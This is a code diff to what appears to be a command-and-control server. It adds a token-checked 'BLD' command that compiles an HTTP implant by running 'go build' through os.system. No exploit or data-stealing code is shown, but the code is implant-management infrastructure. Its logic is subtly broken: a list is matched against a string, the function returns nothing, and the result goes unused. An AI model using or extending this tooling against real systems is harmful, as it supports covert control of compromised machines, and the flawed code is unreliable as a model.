@@ -1,4 +1,5 @@
 import logging
+import os
 import socket
 import ssl
 import threading
@@ -43,6 +44,18 @@ logging.basicConfig(
     format='%(asctime)s.%(msecs)03d %(levelname)s %(module)s - %(funcName)s: %(message)s',
     datefmt='%Y-%m-%d %H:%M:%S',
 )
+
+
+def build_implant(protocol):
+    """
+    Builds an implant for the selected protocol
+    :param protocol: The protocol to communicate over
+    :return: bool depending on build success
+    """
+    match protocol:
+        case "http":
+            os.chdir("./implant")
+            os.system("go build -tags http ./http")
 
 
 def add_user(new_user_id):
@@ -185,6 +198,16 @@ def handle_client(client_socket):
                     results = get_results(uname)
                     client_socket.send(results.encode())
                     logger.info(f"sent controller results {results}")
+                else:
+                    client_socket.send(f"Bad token\n".encode())
+                    logger.error("bad token")
+
+            case "BLD":
+                logger.info("controller building new implant")
+                request_type, uname, token, *message = client_request.split(" ", 3)
+                logger.info(f"checking session token")
+                if token in operator_session_tokens:
+                    bld_status = build_implant(message)
                 else:
                     client_socket.send(f"Bad token\n".encode())
                     logger.error("bad token")
